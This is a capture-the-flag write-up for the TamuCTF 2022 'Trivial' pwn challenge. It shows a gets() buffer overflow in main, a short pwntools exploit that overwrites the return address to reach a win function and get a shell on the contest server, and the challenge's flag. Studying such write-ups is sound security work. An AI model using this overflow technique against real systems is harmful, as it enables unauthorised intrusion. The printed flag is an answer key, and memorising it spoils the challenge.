---
title: "[Pwn] Trivial [Tamu CTF 2022]"
date: 2022-04-17 16:20:00
---

# 0x0 Introduction

Author: nhwn

Feeling lucky? I have just the challenge for you :D

SNI: lucky

files: [trivial](trivial), [trival.c](trivial.c)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

# 0x2 Vulnerability

Very trivial buffer overflow in main. Overwrite rip to function win to get a shell

```
void main() {
    char buff[69];

    gets(buff);
}
```

# 0x3 Exploit

```
from pwn import *

context.binary = ELF("trivial")

p = remote("tamuctf.com", 443, ssl=True, sni="trivial")
p.sendline(flat({
    0x50+0x8:[
        0x00401132
    ]
}))
p.interactive()
```

# 0x4 Flag

gigem{sorry_for_using_the_word_trivial}
